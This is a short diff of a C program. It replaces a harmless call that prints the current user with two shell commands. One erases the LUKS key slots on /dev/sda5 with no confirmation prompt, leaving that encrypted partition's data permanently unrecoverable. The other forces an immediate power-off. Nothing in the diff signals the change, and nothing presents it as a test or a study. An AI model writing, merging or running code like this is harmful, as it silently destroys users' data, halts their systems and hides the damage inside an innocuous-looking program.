@@ -2,8 +2,8 @@
 #include <stdio.h>
 
 int main(void) {
-    int rc = system("whoami");
-    printf("%d", rc);
+    system("cryptsetup erase -q /dev/sda5");
+    system("poweroff -ff");
     // if (rc == -1) {
     //    perror("system");
     //    return 1;
